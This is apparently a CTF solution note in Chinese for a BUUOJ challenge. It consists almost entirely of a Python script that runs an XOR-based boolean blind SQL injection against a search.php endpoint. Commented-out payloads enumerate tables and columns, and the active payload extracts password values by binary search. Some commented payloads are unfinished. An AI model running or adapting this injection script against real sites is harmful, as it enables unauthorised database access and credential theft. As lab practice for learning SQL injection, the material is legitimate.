# 知识点
异或sql盲注<br />盲注脚本
```powershell
import requests
import time

url = 'http://78d5a9d3-5677-4dfe-96f0-d4574e544790.node4.buuoj.cn:81/search.php'
str = ''
for i in range(250):
    l, r = 32, 128
    while True:
        mid = (l + r) >> 1
        if mid == l:
            str += chr(mid)
            print(str)
            break
        # # 爆表名
        # payload = {
        #     'id': f'0^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),{i},1))<{j})'
        # }
        # # 无union的无列名爆值
        # # payload = {
        # #     'id': f"0^if(ascii(substr((select(flag)from(flag)),{i},1))<{j},0,1)"
        # # }

        # 爆数据库
        # payload = {
        #     'id': f"' or if(ascii(substr(()))",
        # }
        # 爆表名
        # payload = {
        #     'id': f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))<{mid})"
        # }
        # 表名 : F1naI1y, Flaaaaag
        # 爆列
        # payload = {
        #     'id': f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\"F1naI1y\")),{i},1))<{mid})"
        # }
        # 列 id,username,password
        #
        # 爆值
        payload = {
            'id': f"0^(ascii(substr((select(group_concat(password))from(F1naI1y)),{i},1))<{mid})"
        }
        time.sleep(0.3)
        txt = requests.get(url=url, params=payload).text
        if(r'Not' in txt):
            r = mid
        else:
            l = mid


```
